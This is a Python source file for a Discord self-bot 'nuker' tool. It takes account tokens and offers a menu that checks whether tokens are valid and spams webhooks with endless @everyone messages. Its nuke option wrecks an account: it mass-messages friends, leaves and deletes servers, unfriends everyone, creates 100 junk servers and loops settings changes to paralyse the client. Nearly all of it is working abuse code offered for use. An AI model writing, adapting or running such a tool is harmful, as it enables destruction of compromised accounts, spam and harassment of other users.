import discord, pyfiglet, random, requests, asyncio, json, time, datetime
from itertools import cycle
from discord.ext import commands
from discord import Webhook, RequestsWebhookAdapter

intents = discord.Intents.all()
client = commands.Bot(command_prefix='-', self_bot=True, intents=intents)

banner = pyfiglet.figlet_format("Sephill Multi-SelfBot", font="slant")
print(banner, "\n by DawoodInDaHood#6666\n")
TOKEN = input("Enter Your Discord Token: ")

@client.event
async def on_connect():
    ans = True
    while ans:
        ans = input("\n[1] Token Checker\n[2] Nuke Current Token\n[3] Get Current Token Info\n[4] Webhook Spammer\n[5] Webhook Info\n[6] Webhook Deleter\n[7] Auto Bumper\n>>>")
        if ans == "1":
            TOKEN = input("Enter A Token: ")
            headers = {'Authorization' : TOKEN}
            check = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
            try:
                if check.status_code == 200:
                    print(f"Token is Valid - {TOKEN}")
                else:
                    print(f"Token is Invalid - {TOKEN}")
            except Exception:
                print("Could not contact discordapp.com")
        elif ans == "2":
            y_n = input("Are You Sure You Want To Nuke?\nThis Will Nuke The Current Token You Entered!!!\nY or N\n>>> ")
            if y_n == "Y":
                ##############DMING FRIENDS
                da_msg = input("Enter Message To DM All Friends: ")
                print("DMING FRIENDS!")
                for user in client.user.friends:
                    await user.send(da_msg)
                    await asyncio.sleep(0.1)
                ##############LEAVING SERVERS
                print("LEAVING SERVERS!")
                for guild in client.guilds:
                    try:
                        await guild.leave()
                        print(f"left server: {guild}")
                    except:
                        print(f"cannot leave server: {guild}")
                
                ##############DELETE OWNED SERVERS
                print("DELETING OWNED SERVERS!")
                for guild in client.guilds:
                    try:
                        await guild.delete()
                        print(f"deleted server: {guild}")
                    except:
                        print(f"cannot delete server: {guild}")
                
                ##############UNFRIEND ALL
                print("UNFRIENDING EVERYONE!")
                for friends in client.user.friends:
                    try:
                        await friends.remove_friend()
                        print(f"removed friend: {friends}")
                    except:
                        print(f"cannot remove friend: {friends}")
                
                ##############CREATE RANDOM SERVERS
                print("CREATING RANDOM SERVERS!")
                for i in range(100):
                    server_name = "Destroyed by Sephill Nuker!"
                    try:
                        await client.create_guild(server_name, region=None, icon=None)
                        print(f"created server: {server_name}")
                    except:
                        print(f"cannot create server: {server_name}")

                ##############PARALYZE USERS DISCORD
                print("Exit program to stop paralyzation")
                print("PARALYZING USER'S DISCORD")
                request_headers = {'Authorization': TOKEN}
                modes = cycle(["light", "dark"])
                while True:
                    paralyzer_setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'ru', 'ro', 'bg'])}
                    requests.patch("https://discord.com/api/v6/users/@me/settings", headers=request_headers, json=paralyzer_setting)
            elif y_n == "N":
                print("Not Nuking")
                pass
        elif ans == "3":
            print(f"Tag: {client.user}")
            print(f"Email: {client.user.email}")
            print(f"2FA: {client.user.mfa_enabled}")
            print(f"ID: {client.user.id}")
            print(f"Verified: {client.user.verified}")
            print(f"NITRO: {client.user.premium}")
            print(f"Avatar: {client.user.avatar_url}")
        elif ans == "4":
            url = input("Enter Discord Webhook To Spam: ")
            msg = input("Enter Your Message To Spam: ")
            webhook = Webhook.from_url(url, adapter=RequestsWebhookAdapter())
            while True:
                webhook.send(f"@everyone {msg}")
        elif ans == "5":
            webhook = input("Enter Discord Webhook: ")
            webhook_info = requests.get(webhook)
            print(json.dumps(webhook_info.json(), indent=4, sort_keys=True))
        elif ans == "6":
            webhook = input("Enter Discord Webhook To Delete: ")
            requests.delete(webhook)
            print("Deleted Webhook!")
        elif ans == "7":
            TOKEN = input("Enter Discord Token(which has the server to bump): ")
            channel_id = input("Enter Channel ID Where Disboard Bot Has Access: ")
            bump_url = f"https://discordapp.com/api/v6/channels/{channel_id}/messages"
            while True:
                headers = {"authorization": TOKEN, "content-type": "application/json"}
                content = {"content":"!d bump"}
                requests.post(bump_url, headers=headers, data=json.dumps(content))
                time_now = datetime.datetime.now()
                time_bumped = time_now.strftime("%m/%d/%Y, %H:%M:%S")
                print(f"Bumped at {time_bumped}!")
                print("Waiting 2 Hours Till Next Bump")
                print("Press CTRL + C To Stop")
                time.sleep(7200)
        else:
            pass

client.run(TOKEN, bot=False)